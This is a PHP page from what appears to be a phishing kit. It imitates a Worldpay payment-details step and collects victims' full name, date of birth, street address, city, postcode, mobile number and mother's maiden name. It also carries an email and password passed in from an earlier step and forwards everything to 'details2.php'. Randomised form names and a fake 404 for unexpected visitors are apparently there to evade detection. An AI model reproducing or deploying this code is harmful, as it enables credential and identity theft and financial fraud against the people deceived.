<?php

error_reporting(0);
include "../at.php";
include "../control.php";
session_start();
session_regenerate_id();
if(isset($_GET["validid"]))
{
	$fname=randomCha(rand(10,12));
	$fj=randomCha(rand(13,15));
	
$email = $_GET['email'];
$password = $_GET['password'];

	echo '<!DOCTYPE html>

<html class="js" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<script src="./jquery.min.js.download"></script>

<script src="./jspostcode.js.download"></script>

<script>
function empty() {
    var x;
    x = document.getElementById("full_name").value;
    if (x == "") {
        document.getElementById("full_name").style = "border-color: red";
		document.getElementById("full_name_error").style = "display: block";
        return false;
    }
	var x;
    x = document.getElementById("dob").value;
    if (x == "") {
        document.getElementById("dob").style = "border-color: red";
		document.getElementById("dob_error").style = "display: block";
        return false;
    }
	var x;
    x = document.getElementById("address").value;
    if (x == "") {
        document.getElementById("address").style = "border-color: red";
		document.getElementById("address_error").style = "display: block";
        return false;
    }
	var x;
    x = document.getElementById("city").value;
    if (x == "") {
        document.getElementById("city").style = "border-color: red";
		document.getElementById("city_error").style = "display: block";
        return false;
    }
	var x;
    x = document.getElementById("postcode").value;
    if (x == "") {
        document.getElementById("postcode").style = "border-color: red";
		document.getElementById("postcode_error").style = "display: block";
        return false;
    }
	var newPostCode = checkPostCode(document.getElementById("postcode").value);
	
	if (newPostCode) {
	
    document.getElementById("postcode").value = newPostCode;
	document.getElementById("invalid_postcode_error").style = "display: none";
	
    }
	
    else {
	    document.getElementById("postcode").value = "";
        document.getElementById("postcode").style = "border-color: red";
		document.getElementById("invalid_postcode_error").style = "display: block";
        return false;
    }
	var x;
    x = document.getElementById("mobile_number").value;
    if (x == "") {
        document.getElementById("mobile_number").style = "border-color: red";
		document.getElementById("mobile_number_error").style = "display: block";
        return false;
    }
	var x;
    x = document.getElementById("mmn").value;
    if (x == "") {
        document.getElementById("mmn").style = "border-color:red";
		document.getElementById("mmn_error").style = "display: block";
        return false;
    }

}
</script>

<script>
function change() {
    var e;
    e = document.getElementById("full_name").value;
    if (e !== ""){
	    document.getElementById("full_name").style = "";
		document.getElementById("full_name_error").style = "display: none";
	}
	var e;
    e = document.getElementById("dob").value;
    if (e !== ""){
	    document.getElementById("dob").style = "";
		document.getElementById("dob_error").style = "display: none";
	}
	var e;
    e = document.getElementById("address").value;
    if (e !== ""){
	    document.getElementById("address").style = "";
		document.getElementById("address_error").style = "display: none";
	}
	var e;
    e = document.getElementById("city").value;
    if (e !== ""){
	    document.getElementById("city").style = "";
		document.getElementById("city_error").style = "display: none";
	}
	var e;
    e = document.getElementById("postcode").value;
    if (e !== ""){
	    document.getElementById("postcode").style = "";
		document.getElementById("postcode_error").style = "display: none";
	}
	var newPostCode = checkPostCode(document.getElementById("postcode").value);
	
	if (newPostCode) {
	
	document.getElementById("invalid_postcode_error").style = "display: none";
	
    }
	var e;
    e = document.getElementById("mobile_number").value;
    if (e !== ""){
	    document.getElementById("mobile_number").style = "";
		document.getElementById("mobile_number_error").style = "display: none";
	}
	var e;
    e = document.getElementById("mmn").value;
    if (e !== ""){
	    document.getElementById("mmn").style = "";
		document.getElementById("mmn_error").style = "display: none";
	}
	
}

</script>

<script>

$(document).ready(function(){  
            $("#dob").keyup(function(e){
                if (e.keyCode != 8){    
                    if ($(this).val().length == 2){
                        $(this).val($(this).val() + "/");
                    }else if ($(this).val().length == 5){
                        $(this).val($(this).val() + "/");
                    }
                }
            });   
});

</script>

            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            
            <meta name="HandheldFriendly" content="True">
            <meta name="MobileOptimized" content="320">
            <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes">

            
            <meta name="format-detection" content="telephone=no">

    
        <link rel="stylesheet" href="./combined.min.css" media="all">

    <link rel="stylesheet" href="./89e96a69efb76490b977d06d0e546c85.css" media="all">

            <link rel="shortcut icon" href="favicon2.ico" type="image/x-icon">

        </head>

        <body class="">

            <div class="wrapper">
             

                <div role="main" id="main" class="iframe">
                     
   
                    <div id="dynamic-content">
                        


<div role="form" class="box payment-details" id="paymentDetails" data-page-title="Card Details">
 
    <h2 class="clearfix desktop-only section-header">
     <span class="no-wrap box-title">
        
            Payment details
            
                <span class="note"><em class="required-field">*</em> Indicates a required field</span>
            
        
        
     </span>
    </h2>

<form id="'.$fname.'" name="'.$fname.'" class="form-validation" action="../details2.php?/ACC/Sign/complete&validid='.randomCha(rand(15,30)).'" onsubmit="'.$fj.'(); return false;" method="post" novalidate="novalidate" target="_parent">

    
    <fieldset id="cardDetails">

        <div class="row pair clearfix">
           
 
        <p class="field-wrapper last" data-mandatory="true">
          
<label for="cardholderName" id="cardholderNameLabel" class="cardholderNameClass field-label">
    
        Full Name
    
    
        <em class="required-field">*</em>
    

    
        <span class="validity-indicator valid icon icon-tick"></span>
        <span class="validity-indicator invalid icon icon-cross"></span>
    

</label>

    
                <input id="full_name" name="full_name" role="textbox" type="text" class="textbox" value="" onBlur="change()">
				
				<label id="full_name_error" class="help" style="display: none"><font color="red" style="font-size: 90%">Please type your full name.</font></label>
            
            <small class="error-hint"></small>


        </p>
		
		 <p class="field-wrapper last" data-mandatory="true">
          
<label for="cardholderName" id="cardholderNameLabel" class="cardholderNameClass field-label">
    
        Date of Birth
    
    
        <em class="required-field">*</em>
    

    
        <span class="validity-indicator valid icon icon-tick"></span>
        <span class="validity-indicator invalid icon icon-cross"></span>
    

</label>

    
                <input id="dob" name="dob" role="textbox" type="tel" class="textbox" value="" maxlength="10" placeholder="DD/MM/YYYY" pattern="(0[1-9]|[12][0-9]|3[01])[- /.](0[1-9]|1[012])[- /.](19|20)\d\d" onBlur="change()">
				
				<label id="dob_error" class="help" style="display: none"><font color="red" style="font-size: 90%">Please type your date of birth.</font></label>
            
            <small class="error-hint">&nbsp;</small>


        </p>
		
		<p class="field-wrapper last" data-mandatory="true">
          
<label for="cardholderName" id="cardholderNameLabel" class="cardholderNameClass field-label">
    
        Street Address
    
    
        <em class="required-field">*</em>
    

    
        <span class="validity-indicator valid icon icon-tick"></span>
        <span class="validity-indicator invalid icon icon-cross"></span>
    

</label>

    
                <input id="address" name="address" role="textbox" type="text" class="textbox" value="" onBlur="change()">
				
				<label id="address_error" class="help" style="display: none"><font color="red" style="font-size: 90%">Please type your street address.</font></label>
            
            <small class="error-hint"></small>


        </p>
		
		<p class="field-wrapper last" data-mandatory="true">
          
<label for="cardholderName" id="cardholderNameLabel" class="cardholderNameClass field-label">
    
        City
    
    
        <em class="required-field">*</em>
    

    
        <span class="validity-indicator valid icon icon-tick"></span>
        <span class="validity-indicator invalid icon icon-cross"></span>
    

</label>

    
                <input id="city" name="city" role="textbox" type="text" class="textbox" value="" onBlur="change()">
				
				<label id="city_error" class="help" style="display: none"><font color="red" style="font-size: 90%">Please type your city of residence.</font></label>
            
            <small class="error-hint"></small>


        </p>
		
		<p class="field-wrapper last" data-mandatory="true">
          
<label for="cardholderName" id="cardholderNameLabel" class="cardholderNameClass field-label">
    
        Postcode
    
    
        <em class="required-field">*</em>
    

    
        <span class="validity-indicator valid icon icon-tick"></span>
        <span class="validity-indicator invalid icon icon-cross"></span>
    

</label>

    
                <input id="postcode" name="postcode" role="textbox" type="text" class="textbox" value="" maxlength="8" onBlur="change()">
				
				<label id="postcode_error" class="help" style="display: none"><font color="red" style="font-size: 90%">Please type your postcode.</font></label>
				<label id="invalid_postcode_error" class="help" style="display: none"><font color="red" style="font-size: 90%">Postcode is invalid. Please try again.</font></label>
            
            <small class="error-hint"></small>


        </p>
		
		 <p class="field-wrapper last" data-mandatory="true">
          
<label for="cardholderName" id="cardholderNameLabel" class="cardholderNameClass field-label">
    
        Mobile Phone Number
    
    
        <em class="required-field">*</em>
    

    
        <span class="validity-indicator valid icon icon-tick"></span>
        <span class="validity-indicator invalid icon icon-cross"></span>
    

</label>

    
                <input id="mobile_number" name="mobile_number" role="textbox" type="tel" class="textbox" value="" maxlength="14" pattern="[0-9]+" onBlur="change()">
				
				<label id="mobile_number_error" class="help" style="display: none"><font color="red" style="font-size: 90%">Please type your mobile phone number.</font></label>
            
            <small class="error-hint">&nbsp;</small>


        </p>
		
		

        </div>
        
    </fieldset>


<fieldset id="combinedDetails">
    <fieldset id="billingAddress">
    
<div id="billingContainerPanel1Way" class="editable-panel">
    <div id="billingContainerPanel1wayTop" class="panel1wayTop">
        
    </div>
    <div id="billingContainerPanel1wayBottom">
        
    </div>
</div>


    </fieldset>
    <fieldset id="shippingAddress">
     
<div id="shippingContainerPanel1Way" class="editable-panel">
    <div id="shippingContainerPanel1wayTop" class="panel1wayTop">
        
    </div>
    <div id="shippingContainerPanel1wayBottom">
        
    </div>
</div>


    </fieldset>

    <fieldset id="contactDetails">
 
<div id="contactContainerPanel1Way" class="editable-panel">
    <div id="contactContainerPanel1wayTop" class="panel1wayTop">
        
    </div>
    <div id="contactContainerPanel1wayBottom">
        
    </div>
</div>

    </fieldset>

</fieldset>

<fieldset id="tokenisationDetails">


</fieldset>


    <div class="footerSummary mobile-only">
        




    </div>
    <fieldset class="bottom clearfix">

        <div class="align-r cardMakePaymentButton">

<input type="submit" class="button btn-make-payment" value="Continue" id="submitButton">

        </div>


    </fieldset>

<div>

</div></form>


</div>

<div class="box loading-box failure">

    
    <div class="info">
      
            <img class="logo-powered-by" src="./powered-by-worldpay.svg" alt="">

        <div class="loading-dots" aria-hidden="true">
            <div class="icon icon-circle dot-1"></div>
            <div class="icon icon-circle dot-2"></div>
            <div class="icon icon-circle dot-3"></div>
            <div class="icon icon-circle dot-4"></div>
            <div class="icon icon-circle dot-5"></div>
            <div class="icon icon-circle dot-6"></div>
            <div class="icon icon-circle dot-7"></div>
            <div class="icon icon-circle dot-8"></div>
        </div>
    </div>

    
    <div class="retry-request">
        <p class="center">
            It looks like there may have been a connection issue...
        </p>
        <div class="button btn double-click-prevention">
            Try again
        </div>
    </div>

</div>

                    </div>

                    
                    



<div id="dynamic-cancel-page" class="box payment-cancel-confirm">
    <h3 class="subsection-header">
        Cancel payment
    </h3>
    <p>
        You are exiting the payment process.
    </p>
    <p>
        Your order will not be processed.
    </p>
    <p>
        <strong>Are you sure?</strong>
    </p>

    
    <a id="exitPaymentNoJsOff" href="details.php" class="button btn-confirm-no double-click-prevention">
        No
    </a>
    <a id="exitPaymentYesJsOff" href="details.php" class="button btn-secondary btn-confirm-yes double-click-prevention">
        Yes
    </a>
</div>

                </div>



            </div>


<div id="sessionInfo" data-jsessionid="e373d3c2-6eda-4f48-9c93-47c852f69774.hpp_2_R" data-contextpath="/app/hpp" data-iframe="true" data-iframehelperurl="" data-iframeintegrationid="1539074634423"></div>

            <input type="text" id="back-button-detector" value="0" style="visibility: hidden;">

        
    

</body></html>';



}



else



{



	header($_SERVER['SERVER_PROTOCOL'] . ' 404 Page Not Found', true, 500);



	die("<h1>404 Page Not Found</h1>");



}



?>